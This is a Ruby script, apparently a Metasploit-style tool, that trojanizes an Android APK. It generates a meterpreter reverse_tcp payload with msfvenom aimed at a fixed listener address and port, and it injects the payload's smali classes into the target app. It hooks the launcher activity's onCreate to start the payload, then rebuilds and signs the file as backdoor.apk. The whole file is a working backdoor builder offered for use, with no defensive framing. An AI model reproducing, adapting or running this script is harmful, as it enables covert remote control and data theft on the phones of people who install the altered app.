#!/usr/bin/env ruby

require 'nokogiri'
require 'fileutils'

apkfile = ARGV[0]
unless(apkfile && File.readable?(apkfile))
    puts "Usage: #{$0} /apk/to/backdoor.apk"
    exit(1)
end

apktool = `which apktool`
unless(apktool && apktool.length > 0)
    puts "No apktool"
    exit(1)
end

jarsigner = `which jarsigner`
unless(jarsigner && jarsigner.length > 0)
    puts "No jarsigner"
    exit(1)
end

`./msfvenom -f raw -p android/meterpreter/reverse_tcp LHOST=172.16.197.79 LPORT=4444 > payload.apk`

`jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA payload.apk androiddebugkey`

`rm -rf original`
`rm -rf payload`

`cp #{apkfile} original.apk`

`apktool d original.apk`
`apktool d payload.apk`

f = File.open("original/AndroidManifest.xml")
amanifest = Nokogiri::XML(f)
f.close

# Find the activity that is opened when you click the app icon
def findlauncheractivity(amanifest)
    package = amanifest.xpath("//manifest").first['package']
    activities = amanifest.xpath("//activity")
    for activity in activities 
        activityname = activity.attribute("name")
        category = activity.search('category')
        unless category
            next
        end
        for cat in category
            categoryname = cat.attribute('name')
            if categoryname.to_s == 'android.intent.category.LAUNCHER'
                activityname = activityname.to_s
                unless activityname.start_with?(package)
                    activityname = package + activityname
                end
                return activityname
            end
        end
    end
end

launcheractivity = findlauncheractivity(amanifest)
smalifile = 'original/smali/' + launcheractivity.gsub(/\./, "/") + '.smali'
FileUtils.mkdir_p('original/smali/com/metasploit/stage/')
FileUtils.cp Dir.glob('payload/smali/com/metasploit/stage/Payload*.smali'), 'original/smali/com/metasploit/stage/'

activitysmali = File.read(smalifile)
activitycreate = ';->onCreate(Landroid/os/Bundle;)V'
payloadhook = activitycreate + "\n    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V"
hookedsmali = activitysmali.gsub(activitycreate, payloadhook)
File.open(smalifile, "w") {|file| file.puts hookedsmali }

`apktool b -o backdoor.apk original`
`jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA backdoor.apk androiddebugkey`

puts "Created backdoor.apk with meterpreter payload\n"

